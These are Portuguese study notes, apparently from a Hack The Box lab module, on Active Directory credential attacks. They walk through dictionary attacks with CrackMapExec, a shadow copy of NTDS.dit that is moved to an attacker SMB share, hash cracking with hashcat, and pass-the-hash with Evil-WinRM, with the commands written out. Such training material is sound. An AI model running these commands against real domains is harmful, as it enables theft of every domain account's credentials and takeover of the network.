Antes de colocarmos a mão na massa com os métodos de ataque, vamos considerar o processo de autenticação depois que um sistema Windows foi unido ao domínio. Essa abordagem nos ajudará a entender melhor a importância do Active Directory e os ataques de senha aos quais ele pode ser suscetível.

![[Pasted image 20240913135717.png]]

Após a integração de um sistema Windows a um domínio, ele deixa de usar o banco de dados SAM (Security Account Manager) para validar solicitações de login por padrão, passando a enviar todas as solicitações de autenticação para o controlador de domínio. No entanto, o banco de dados SAM ainda pode ser usado para logins locais, que podem ser realizados especificando o `hostname` do dispositivo seguido pelo `Username` (por exemplo, `WS01/nameofuser`) ou acessando diretamente o dispositivo e digitando `./` no campo `Username`.

Essa consideração é importante para entender o impacto dos ataques e identificar possíveis vetores de ataque em sistemas operacionais Windows, tanto em desktop quanto em servidores, com acesso físico direto ou remoto. Também é relevante para o estudo de ataques NTDS, como detalhado na técnica [T1003.003](https://attack.mitre.org/techniques/T1003/003/).

## Ataques de dicionário contra contas AD usando CrackMapExec

Um ataque de dicionário envolve usar um computador para adivinhar nomes de usuário e senhas a partir de uma lista de possibilidades. Esses ataques podem gerar tráfego de rede intenso e alertas no sistema de destino, além de serem bloqueados por restrições de tentativa de login.

Para tornar um ataque de dicionário mais eficaz, pode-se personalizá-lo com informações específicas da organização-alvo, como nomes de funcionários obtidos através de mídias sociais ou diretórios de empresas. Muitas organizações utilizam convenções de nomenclatura para criar nomes de usuário, o que pode ajudar a refinar o ataque.

| Username Convention                 | Practical Example for Jane Jill Doe |
| ----------------------------------- | ----------------------------------- |
| `firstinitiallastname`              | jdoe                                |
| `firstinitialmiddleinitiallastname` | jjdoe                               |
| `firstnamelastname`                 | janedoe                             |
| `firstname.lastname`                | jane.doe                            |
| `lastname.firstname`                | doe.jane                            |
| `nickname`                          | doedoehacksstuff                    |
Frequentemente, a estrutura de um endereço de e-mail nos dará o nome de usuário do funcionário (estrutura: nomedeusuario@domínio). Por exemplo, a partir do endereço de e-mail `jdoe`@ `inlanefreight.com`, vemos que `jdoe` é o nome de usuário.

#### Criando uma lista personalizada de nomes de usuários

Manteremos a lista relativamente curta para o propósito desta lição porque as organizações podem ter um grande número de funcionários. Exemplo de lista de nomes:

- Ben Williamson
- Bob Burgerstien
- Jim Stevenson
- Jill Johnson
- Jane Doe

Podemos usar um editor de texto baseado em linha de comando como `Vim` ou um editor de texto gráfico para criar nossa lista. Nossa lista pode ser parecida com esta:

```shell-session
NycolasRamos@htb[/htb]$ cat usernames.txt
```
![[Pasted image 20240913141101.png]]

É importante criar uma lista de nomes de usuários com diferentes convenções de nomenclatura, caso a convenção utilizada pela organização de destino seja desconhecida. Isso pode ser feito manualmente ou usando ferramentas automatizadas, como o **Username Anarchy** (uma ferramenta baseada em Ruby). Essa ferramenta pode ser clonada via Git e usada para gerar uma lista de nomes de usuários a partir de uma lista de nomes reais.

```shell-session
NycolasRamos@htb[/htb]$ ./username-anarchy -i /home/ltnbob/names.txt 
```
![[Pasted image 20240913152508.png]]

Usar ferramentas automatizadas pode nos poupar tempo ao elaborar listas.

#### Lançando o ataque com CrackMapExec
Podemos usar uma ferramenta como CrackMapExec em conjunto com o protocolo SMB para enviar solicitações de logon para o controlador de domínio de destino. Aqui está o comando para fazer isso:

```shell-session
NycolasRamos@htb[/htb]$ crackmapexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
```
![[Pasted image 20240913160155.png]]

Usamos o **CrackMapExec** para realizar tentativas de login via SMB com o usuário "bwilliamson" e uma lista de senhas comuns. O ataque usa a wordlist **fasttrack.txt** para tentar descobrir a senha. No entanto, se houver uma política de bloqueio de conta configurada, esse ataque pode bloquear a conta alvo. Em janeiro de 2022, políticas de bloqueio de contas não são aplicadas por padrão em domínios Windows, deixando muitos ambientes vulneráveis a esse tipo de ataque.

#### Registros de eventos do ataque
![[Pasted image 20240913160534.png]]

É importante que  verifiquemos os vestígios deixados por um ataque para fornecer recomendações de remediação mais eficazes. Em sistemas Windows, administradores podem usar o **Event Viewer** para revisar eventos de segurança e entender ações registradas, auxiliando na implementação de controles de segurança mais rigorosos e em investigações após uma violação.

Além disso, após obter credenciais, é possível tentar acessar remotamente o controlador de domínio para capturar o arquivo **NTDS.dit**, que contém dados importantes de autenticação.

## Capturando NTDS.dit
`NT Directory Services`( `NTDS`) é o serviço de diretório usado com o AD para encontrar e organizar recursos de rede. Lembre-se de que o arquivo `NTDS.dit` é armazenado em `%systemroot%/ntds` nos controladores de domínio em uma [floresta](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/using-the-organizational-domain-forest-model) . O `.dit`significa [árvore de informações de diretório](https://docs.oracle.com/cd/E19901-01/817-7607/dit.html) .

O arquivo **NTDS.dit** é o banco de dados principal do Active Directory (AD), armazenando todos os nomes de usuários de domínio, hashes de senha e outras informações críticas. Capturar esse arquivo pode comprometer todas as contas no domínio, similar à técnica descrita na seção **Attacking SAM**. Ao praticar essa técnica, é importante considerar medidas para proteger o AD e prevenir tais ataques.

#### Conectando a um DC com Evil-WinRM
Podemos nos conectar a um DC de destino usando as credenciais que capturamos.

```shell-session
NycolasRamos@htb[/htb]$ evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'
```

O ``Evil-WinRM`` se conecta a um destino usando o serviço de Gerenciamento Remoto do Windows combinado com o Protocolo Remoto do PowerShell para estabelecer uma sessão do ``PowerShell`` com o destino.

#### Verificando a Associação do Grupo Local
Uma vez conectado, podemos verificar quais privilégios `bwilliamson`ele tem. Podemos começar olhando para a associação do grupo local usando o comando:

```shell-session
*Evil-WinRM* PS C:\> net localgroup
```
![[Pasted image 20240913161350.png]]

Estamos procurando ver se a conta tem direitos de administrador local. Para fazer uma cópia do arquivo NTDS.dit, precisamos de direitos de administrador local ( `Administrators group`) ou de administrador de domínio ( `Domain Admins group`) (ou equivalente). Também queremos verificar quais privilégios de domínio temos.

#### Verificando privilégios de conta de usuário, incluindo domínio

```shell-session
*Evil-WinRM* PS C:\> net user bwilliamson
```
![[Pasted image 20240913161445.png]]

Esta conta tem direitos de Administrador e Administrador de Domínio, o que significa que podemos fazer praticamente tudo o que quisermos, inclusive fazer uma cópia do arquivo NTDS.dit.

#### Criando cópia de sombra de C:
Podemos usar o comando **`vssadmin`** para criar uma **Cópia de Sombra de Volume (VSS)** da unidade C: ou de qualquer outro volume onde o Active Directory (AD) possa estar instalado. Embora o NTDS geralmente esteja em C: (o local padrão), é possível que o local tenha sido alterado.

O VSS é utilizado porque permite fazer cópias de volumes que estão sendo ativamente lidos e gravados sem interromper aplicativos ou sistemas, e é uma ferramenta comum em softwares de backup e recuperação de desastres.

```shell-session
*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:
```
![[Pasted image 20240913161752.png]]

#### Copiando NTDS.dit do VSS
Podemos então copiar o arquivo NTDS.dit da cópia de sombra do volume C: para outro local na unidade para preparar a movimentação do NTDS.dit para nosso host de ataque.

```shell-session
*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```
![[Pasted image 20240913170548.png]]

Antes de copiar ``NTDS.dit`` para nosso host de ataque, podemos querer usar a técnica que aprendemos anteriormente para criar um compartilhamento SMB em nosso host de ataque. Sinta-se à vontade para voltar à `Attacking SAM`seção para revisar esse método, se necessário.

#### Transferindo NTDS.dit para o Host de Ataque
Agora `cmd.exe /c move` pode ser usado para mover o arquivo do DC de destino para o compartilhamento em nosso host de ataque.

```shell-session
*Evil-WinRM* PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData 
```
![[Pasted image 20240913170643.png]]

#### Um método mais rápido: usando cme para capturar NTDS.dit
Alternativamente, podemos nos beneficiar do uso do CrackMapExec para realizar os mesmos passos mostrados acima, tudo com um comando. Este comando nos permite utilizar o VSS para capturar e despejar rapidamente o conteúdo do arquivo NTDS.dit convenientemente dentro da nossa sessão de terminal.

```shell-session
NycolasRamos@htb[/htb]$ crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
```
![[Pasted image 20240913171023.png]]

## Quebrando Hashes e Obtendo Credenciais
Podemos prosseguir criando um arquivo de texto contendo todos os hashes do NT ou podemos copiar e colar individualmente um hash específico em uma sessão de terminal e usar o Hashcat para tentar quebrar o hash e uma senha em texto simples.

#### Quebrando um único hash com Hashcat
```shell-session
NycolasRamos@htb[/htb]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```
![[Pasted image 20240913171101.png]]

Em muitas das técnicas que abordamos até agora, tivemos sucesso em quebrar os hashes que obtivemos.
`What if we are unsuccessful in cracking a hash?`

## Considerações sobre o Pass-the-Hash
Ainda podemos usar hashes para tentar autenticar com um sistema usando um tipo de ataque chamado `Pass-the-Hash`( `PtH`). Um ataque PtH aproveita o [protocolo de autenticação NTLM](https://docs.microsoft.com/en-us/windows/win32/secauthn/microsoft-ntlm#:~:text=NTLM%20uses%20an%20encrypted%20challenge,to%20the%20secured%20NTLM%20credentials) para autenticar um usuário usando um hash de senha. Em vez de `username`: `clear-text password`como formato para login, podemos usar `username`: `password hash`. Aqui está um exemplo de como isso funcionaria:

#### Exemplo de passagem de hash com Evil-WinRM

```shell-session
NycolasRamos@htb[/htb]$ evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"
```

Podemos tentar usar esse ataque quando precisarmos nos mover lateralmente por uma rede após o comprometimento inicial de um alvo. Mais sobre PtH será abordado no módulo `AD Enumeration and Attacks`.











